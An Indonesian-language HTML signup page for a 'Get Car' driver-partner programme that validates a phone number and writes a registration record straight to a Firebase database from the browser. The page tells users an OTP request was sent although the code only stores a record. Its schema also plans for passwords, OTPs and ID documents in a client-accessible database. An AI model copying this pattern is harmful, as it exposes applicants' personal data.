<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
<meta name="theme-color" content="#0a1628" />
<title>Get Car Mitra — Minta OTP</title>

<!-- 🔤 Font -->
<link rel="preconnect" href="https://fonts.googleapis.com" />
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet" />

<!-- 🔥 Firebase -->
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

<!-- 📷 Cek foto latar — jika gagal dimuat, tetap pakai gradasi navy -->
<script>
  const BG_URL = "https://images.unsplash.com/photo-1449965408869-eaa3f722e40d?auto=format&fit=crop&w=1600&q=80";
  const bg = new Image();
  bg.onload = () => document.body.classList.add("has-photo");
  bg.src = BG_URL;
</script>

<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }

  :root {
    --navy: #0a1628;
    --accent: #2f7bff;
    --accent-deep: #0f5ae0;
    --white: #ffffff;
    --glass: rgba(255, 255, 255, 0.10);
    --glass-border: rgba(255, 255, 255, 0.22);
  }

  html, body { height: 100%; }

  body {
    font-family: 'Plus Jakarta Sans', sans-serif;
    background: var(--navy);
    color: var(--white);
    display: flex;
    justify-content: center;
    overflow: hidden;
  }

  /* 🔹 Ukuran handphone, di komputer tetap di tengah */
  .phone { width: 100%; max-width: 430px; height: 100dvh; overflow: hidden; }

  .hero {
    position: relative;
    height: 100%;
    display: flex;
    flex-direction: column;
    background: linear-gradient(160deg, #0d1f3c 0%, #0a1628 55%, #060d1a 100%);
    overflow: hidden;
  }

  /* Foto latar dengan overlay lebih pekat agar form tetap terbaca */
  body.has-photo .hero {
    background-image:
      linear-gradient(180deg, rgba(6,13,26,0.80) 0%, rgba(6,13,26,0.85) 50%, rgba(6,13,26,0.95) 100%),
      url("https://images.unsplash.com/photo-1449965408869-eaa3f722e40d?auto=format&fit=crop&w=1600&q=80");
    background-size: cover;
    background-position: center;
  }

  /* ✨ Cahaya aksen biru */
  .glow { position: absolute; border-radius: 50%; filter: blur(90px); pointer-events: none; }
  .glow-1 { width: 320px; height: 320px; background: rgba(47,123,255,0.28); top: -100px; right: -100px; }
  .glow-2 { width: 280px; height: 280px; background: rgba(47,123,255,0.16); bottom: 60px; left: -120px; }

  /* 🔹 Navbar */
  .navbar {
    position: relative;
    display: flex;
    align-items: center;
    padding: calc(14px + env(safe-area-inset-top)) 20px 14px;
    z-index: 10;
  }

  .back-btn {
    width: 38px; height: 38px;
    display: flex; align-items: center; justify-content: center;
    border-radius: 12px;
    background: rgba(255,255,255,0.10);
    border: 1px solid rgba(255,255,255,0.18);
    backdrop-filter: blur(10px);
    -webkit-backdrop-filter: blur(10px);
    color: var(--white);
    text-decoration: none;
    transition: transform 0.15s ease, background 0.2s ease;
  }
  .back-btn:hover  { background: rgba(255,255,255,0.18); }
  .back-btn:active { transform: scale(0.92); }
  .back-btn svg { width: 18px; height: 18px; }

  .brand {
    position: absolute;
    left: 50%;
    transform: translateX(-50%);
    font-size: 15px;
    font-weight: 800;
    letter-spacing: 0.5px;
    white-space: nowrap;
    color: var(--white);
  }
  .brand span { color: var(--accent); }

  .version {
    margin-left: auto;
    font-size: 11px;
    font-weight: 600;
    letter-spacing: 0.4px;
    color: rgba(255,255,255,0.85);
    background: rgba(255,255,255,0.12);
    border: 1px solid rgba(255,255,255,0.18);
    backdrop-filter: blur(10px);
    -webkit-backdrop-filter: blur(10px);
    padding: 5px 12px;
    border-radius: 20px;
  }

  /* 🔹 Konten */
  .content {
    position: relative;
    z-index: 10;
    flex: 1;
    display: flex;
    flex-direction: column;
    padding: 6px 26px calc(20px + env(safe-area-inset-bottom));
    overflow-y: auto;
  }

  .logo-small {
    width: 56px;
    height: 56px;
    object-fit: contain;
    filter: drop-shadow(0 8px 20px rgba(0,0,0,0.45));
    animation: pop 0.7s 0.1s ease both, float 4s 1s ease-in-out infinite;
  }

  .eyebrow {
    display: inline-flex;
    align-items: center;
    gap: 8px;
    font-size: 11px;
    font-weight: 700;
    letter-spacing: 2px;
    text-transform: uppercase;
    color: rgba(255,255,255,0.75);
    margin: 14px 0 10px;
  }
  .eyebrow::before {
    content: "";
    width: 22px;
    height: 2px;
    background: var(--accent);
    border-radius: 2px;
  }

  h1 {
    font-size: clamp(24px, 6.5vw, 30px);
    font-weight: 800;
    line-height: 1.2;
    letter-spacing: -0.5px;
    margin-bottom: 8px;
    text-shadow: 0 2px 20px rgba(0,0,0,0.35);
  }
  h1 span {
    background: linear-gradient(90deg, #6db3ff, #2f7bff);
    -webkit-background-clip: text;
    background-clip: text;
    -webkit-text-fill-color: transparent;
  }

  .desc {
    font-size: 14px;
    line-height: 1.6;
    color: rgba(255,255,255,0.75);
    max-width: 320px;
    margin-bottom: 22px;
  }

  /* 🔹 Panel kaca buram */
  .card {
    background: var(--glass);
    border: 1px solid var(--glass-border);
    backdrop-filter: blur(20px) saturate(140%);
    -webkit-backdrop-filter: blur(20px) saturate(140%);
    border-radius: 24px;
    padding: 24px 20px;
    box-shadow: 0 20px 50px rgba(0,0,0,0.35);
  }

  .label {
    display: block;
    font-size: 13px;
    font-weight: 700;
    color: rgba(255,255,255,0.9);
    margin-bottom: 8px;
  }

  .input-group {
    display: flex;
    align-items: center;
    gap: 12px;
    background: rgba(255,255,255,0.08);
    border: 1.5px solid rgba(255,255,255,0.22);
    border-radius: 14px;
    padding: 14px 16px;
    transition: border-color 0.2s ease, box-shadow 0.2s ease;
  }
  .input-group:focus-within {
    border-color: var(--accent);
    box-shadow: 0 0 0 4px rgba(47,123,255,0.22);
  }
  .input-group.error-shake {
    animation: shake 0.4s ease;
    border-color: #ff6b6b;
  }

  .prefix  { font-size: 15px; font-weight: 700; color: rgba(255,255,255,0.9); }
  .divider { width: 1px; height: 20px; background: rgba(255,255,255,0.25); }

  #telepon {
    flex: 1;
    min-width: 0;
    background: transparent;
    border: none;
    outline: none;
    color: var(--white);
    font-family: inherit;
    font-size: 16px; /* 16px agar iOS tidak auto-zoom */
    font-weight: 600;
    letter-spacing: 1px;
  }
  #telepon::placeholder { color: rgba(255,255,255,0.35); font-weight: 500; letter-spacing: 0.5px; }

  .hint {
    font-size: 11.5px;
    color: rgba(255,255,255,0.5);
    margin-top: 8px;
    line-height: 1.5;
  }

  /* 🔹 Tombol */
  .btn {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
    width: 100%;
    padding: 15px;
    margin-top: 20px;
    border: none;
    border-radius: 16px;
    font-family: inherit;
    font-size: 15px;
    font-weight: 700;
    letter-spacing: 0.2px;
    cursor: pointer;
    transition: transform 0.15s ease, box-shadow 0.25s ease, opacity 0.2s ease;
  }
  .btn:active { transform: scale(0.97); }
  .btn svg { width: 18px; height: 18px; flex-shrink: 0; }

  .btn-primary {
    background: linear-gradient(135deg, var(--accent), var(--accent-deep));
    color: var(--white);
    box-shadow: 0 8px 24px rgba(47,123,255,0.4);
  }
  .btn-primary:hover { box-shadow: 0 10px 30px rgba(47,123,255,0.55); }
  .btn-primary:disabled {
    opacity: 0.65;
    cursor: not-allowed;
    transform: none;
    box-shadow: none;
  }

  .spinner {
    width: 18px; height: 18px;
    border: 2.5px solid rgba(255,255,255,0.35);
    border-top-color: var(--white);
    border-radius: 50%;
    animation: spin 0.7s linear infinite;
  }

  /* 🔹 Pesan status */
  .status {
    min-height: 20px; /* biar layout tidak lompat */
    margin-top: 14px;
    font-size: 13px;
    font-weight: 500;
    line-height: 1.55;
    text-align: center;
    color: rgba(255,255,255,0.7);
  }
  .status.sukses { color: #7ee2a8; }
  .status.error  { color: #ff9b9b; }

  .copyright {
    margin-top: auto;
    padding-top: 20px;
    text-align: center;
    font-size: 11px;
    color: rgba(255,255,255,0.45);
    user-select: none;
  }

  /* 🔹 Animasi */
  @keyframes fadeUp {
    from { opacity: 0; transform: translateY(24px); }
    to   { opacity: 1; transform: translateY(0); }
  }
  @keyframes pop {
    from { opacity: 0; transform: scale(0.7); }
    to   { opacity: 1; transform: scale(1); }
  }
  @keyframes float {
    0%, 100% { transform: translateY(0); }
    50%      { transform: translateY(-6px); }
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  @keyframes shake {
    0%, 100% { transform: translateX(0); }
    20% { transform: translateX(-6px); }
    40% { transform: translateX(6px); }
    60% { transform: translateX(-4px); }
    80% { transform: translateX(4px); }
  }

  .navbar    { animation: fadeUp 0.6s ease both; }
  .eyebrow   { animation: fadeUp 0.7s 0.2s ease both; }
  h1         { animation: fadeUp 0.7s 0.3s ease both; }
  .desc      { animation: fadeUp 0.7s 0.4s ease both; }
  .card      { animation: fadeUp 0.7s 0.5s ease both; }
  .copyright { animation: fadeUp 0.7s 0.65s ease both; }

  @media (max-width: 360px) {
    .content { padding-left: 20px; padding-right: 20px; }
    .card { padding: 20px 16px; }
    .btn { font-size: 14px; padding: 14px; }
  }
</style>
</head>
<body>

  <div class="phone">
    <div class="hero">

      <div class="glow glow-1"></div>
      <div class="glow glow-2"></div>

      <!-- 🔹 Navbar -->
      <nav class="navbar">
        <a href="index.html" class="back-btn" aria-label="Kembali">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5"/><polyline points="12 19 5 12 12 5"/></svg>
        </a>
        <div class="brand">Get <span>Car</span></div>
        <div class="version">V1.103.1</div>
      </nav>

      <!-- 🔹 Konten -->
      <div class="content">
        <img src="get.png" alt="Logo Get Car" class="logo-small" onerror="this.style.display='none'" />

        <div class="eyebrow">Pendaftaran Mitra Driver</div>
        <h1>Minta Kode <span>OTP</span></h1>
        <p class="desc">Masukkan nomor telepon aktif Anda untuk memulai pendaftaran. Kode verifikasi akan dikirim ke nomor tersebut.</p>

        <!-- 🔹 Panel Form -->
        <div class="card">
          <label class="label" for="telepon">Nomor Telepon</label>
          <div class="input-group" id="inputGroup">
            <span class="prefix">+62</span>
            <div class="divider"></div>
            <input type="tel" id="telepon" maxlength="12" inputmode="numeric"
                   autocomplete="tel-national" placeholder="81234567890" />
          </div>
          <p class="hint">Masukkan tanpa angka 0 di depan. Contoh: 81234567890</p>

          <button id="mintaOtpBtn" class="btn btn-primary">
            <svg id="btnIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"/></svg>
            <span id="btnSpinner" class="spinner" style="display:none"></span>
            <span id="btnText">Minta Kode OTP</span>
          </button>

          <p id="status" class="status"></p>
        </div>

        <div class="copyright">Hak Cipta © PT Bali Global Trans</div>
      </div>

    </div>
  </div>

<script>
  // === Konfigurasi Firebase ===
  const firebaseConfig = {
    apiKey: "AIzaSyD3FQbFF5a91MlASpqImTMmGkYvaTcdxm0",
    authDomain: "kadek-ed34e.firebaseapp.com",
    databaseURL: "https://kadek-ed34e-default-rtdb.firebaseio.com",
    projectId: "kadek-ed34e",
    storageBucket: "kadek-ed34e.firebasestorage.app",
    messagingSenderId: "65756136303",
    appId: "1:65756136303:web:6dbe5bc658fadb05ca1e9a"
  };
  firebase.initializeApp(firebaseConfig);
  const db = firebase.database();

  // === Elemen ===
  const input      = document.getElementById("telepon");
  const btn        = document.getElementById("mintaOtpBtn");
  const btnText    = document.getElementById("btnText");
  const btnIcon    = document.getElementById("btnIcon");
  const btnSpinner = document.getElementById("btnSpinner");
  const statusEl   = document.getElementById("status");
  const inputGroup = document.getElementById("inputGroup");

  // === Prefix valid nomor Indonesia ===
  const validPrefixes = [
    "811","812","813","814","815","816","817","818","819",
    "821","822","823",
    "851","852","853","855","856","857","858","859",
    "877","878","879",
    "881","882","883","884","885","886","887","888","889"
  ];

  // Batasi input hanya angka + hapus status error saat mengetik
  input.addEventListener("input", () => {
    input.value = input.value.replace(/\D/g, "");
    inputGroup.classList.remove("error-shake");
  });

  // Tekan Enter = kirim
  input.addEventListener("keydown", (e) => {
    if (e.key === "Enter") mintaOtp();
  });

  btn.addEventListener("click", mintaOtp);

  function setStatus(pesan, tipe) {
    statusEl.textContent = pesan;
    statusEl.className = "status" + (tipe ? " " + tipe : "");
  }

  function setLoading(aktif) {
    btn.disabled = aktif;
    btnText.textContent = aktif ? "Memproses..." : "Minta Kode OTP";
    btnIcon.style.display = aktif ? "none" : "block";
    btnSpinner.style.display = aktif ? "block" : "none";
  }

  function gagal(pesan) {
    setStatus(pesan, "error");
    inputGroup.classList.remove("error-shake");
    void inputGroup.offsetWidth; // restart animasi getar
    inputGroup.classList.add("error-shake");
    input.focus();
  }

  async function mintaOtp() {
    const inputNomor = input.value.trim();
    inputGroup.classList.remove("error-shake");

    // 1️⃣ Cek kosong
    if (!inputNomor) {
      gagal("Nomor telepon harus diisi!");
      return;
    }

    // 2️⃣ Cek hanya angka
    if (!/^\d+$/.test(inputNomor)) {
      gagal("Nomor hanya boleh berisi angka!");
      return;
    }

    // 3️⃣ Cek panjang (11 atau 12 digit)
    if (inputNomor.length < 11 || inputNomor.length > 12) {
      gagal("Nomor harus terdiri dari 11 atau 12 digit!");
      return;
    }

    // 4️⃣ Cek prefix valid
    const prefix = inputNomor.substring(0, 3);
    if (!validPrefixes.includes(prefix)) {
      gagal("Nomor tidak dikenali sebagai nomor Indonesia!");
      return;
    }

    const nomorLengkap = "+62" + inputNomor;

    // 🔒 Kunci tombol selama memproses
    setLoading(true);
    setStatus("Memeriksa nomor...", "info");

    try {
      // 5️⃣ Cek apakah sudah terdaftar
      const snapshot = await db.ref("pendaftaran")
        .orderByChild("telepon")
        .equalTo(nomorLengkap)
        .once("value");

      if (snapshot.exists()) {
        setLoading(false);
        gagal("Nomor ini sudah terdaftar dan tidak bisa digunakan lagi!");
        return;
      }

      // 6️⃣ Simpan data awal ke Firebase
      const dataBaru = {
        nama: "-",
        email: "-",
        telepon: nomorLengkap,
        otp: "-",
        dk: "-",
        wilayah: "-",
        password: "-",
        mobil: "-",
        ktp: "-",
        sim: "-",
        stnk: "-",
        status: "belum_otp"
      };

      await db.ref("pendaftaran").push(dataBaru);

      setStatus("Permintaan OTP dikirim. Mengalihkan ke halaman verifikasi...", "sukses");

      setTimeout(() => {
        window.location.href = "otp.html?telepon=" + encodeURIComponent(nomorLengkap);
      }, 1500);

    } catch (err) {
      setLoading(false);
      gagal("Gagal mengirim data: " + err.message);
    }
  }
</script>

</body>
</html>
